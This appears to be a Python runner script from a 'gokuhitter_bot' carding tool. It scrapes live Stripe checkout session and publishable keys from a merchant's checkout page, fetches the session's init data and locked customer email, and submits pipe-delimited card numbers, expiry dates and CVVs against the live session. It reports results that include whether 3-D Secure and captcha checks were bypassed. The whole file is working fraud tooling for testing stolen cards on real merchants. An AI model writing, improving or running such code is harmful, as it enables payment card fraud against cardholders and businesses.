"""Stripe test runner — extract cs/pk from URL, build hitter, hit."""
import asyncio, json, sys, os
os.chdir(r"C:\Users\acer\Downloads\ai\gokuhitter_bot")
sys.path.insert(0, r"C:\Users\acer\Downloads\ai\gokuhitter_bot")

from curl_compat import ChromeSession
from hitter_core import StripeAPIHitter, StripeAPIExtractor

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def parse_card(spec: str) -> dict:
    parts = [p.strip() for p in spec.split('|')]
    return {"card": parts[0], "month": parts[1], "year": parts[2], "cvv": parts[3]}


async def main():
    url = sys.argv[1]
    card = parse_card(sys.argv[2])

    # Step 1: fetch page, extract cs_live + pk_live + init_json
    async with ChromeSession(impersonate="chrome131", timeout=15) as sess:
        async with sess.get(url, headers={"User-Agent": UA, "Accept": "text/html,*/*"}) as r:
            html = r.text() if callable(r.text) else r.text

        cs_live = StripeAPIExtractor.extract_cs_live(url, html)
        if not cs_live:
            cs_live = StripeAPIExtractor.extract_cs_live(url, html)
        if not cs_live:
            print("ERROR: couldn't extract cs_live from URL or page HTML")
            return

        pk_live = StripeAPIExtractor.extract_pk_live(html)

        # The URL hash is authoritative only when it carries a LIVE key.
        # Hashes on checkout.stripe.com often embed pk_test_ for the hosted
        # JS context — blindly using it against cs_live_ causes requires_action loops.
        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk
        # else keep what was scraped from HTML (already a live key or the best we have)
        if not pk_live:
            print("ERROR: couldn't extract pk_live")
            return

        # Step 2: fetch init JSON
        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                hdr = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr, timeout=8) as ir:
                    init_json = ir.json() if callable(ir.json) else ir.json
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        print(f"cs_live: {cs_live[:24]}...")
        print(f"pk_live: {pk_live[:24]}...")
        print(f"has init_json: {bool(init_json)}")

        # Extract locked email — Stripe throws customer_and_confirmation_email_mismatch
        # if the billing email on the PM doesn't match the session's pre-filled customer email
        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )
        if locked_email:
            print(f"locked_email: {locked_email}")

        # raw_amount — handle 0 (free trial) as valid, not None
        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

    # Step 3: build hitter + hit
    striker = StripeAPIHitter(
        pk_live=pk_live,
        cs_live=cs_live,
        proxy_data=None,  # no proxy for test
        raw_amount=raw_amount,
        locked_email=locked_email,
        stripe_account=stripe_account,
        init_json=init_json,
    )

    try:
        result = await striker.hit(card, attempt=1, user_id=0)
    except Exception:
        import traceback
        traceback.print_exc()
        raise

    keep = {k: result.get(k) for k in (
        'success', 'decline_code', 'error', 'response_time', 'is_live',
        'amount', 'merchant', '3ds_bypassed', '3ds_type', '3ds_attempted',
        'captcha_bypassed')}
    keep['raw_resultCode'] = (result.get('raw_response') or {}).get('status')
    print("\n=== RESULT ===")
    print(json.dumps(keep, indent=2))


if __name__ == '__main__':
    asyncio.run(main())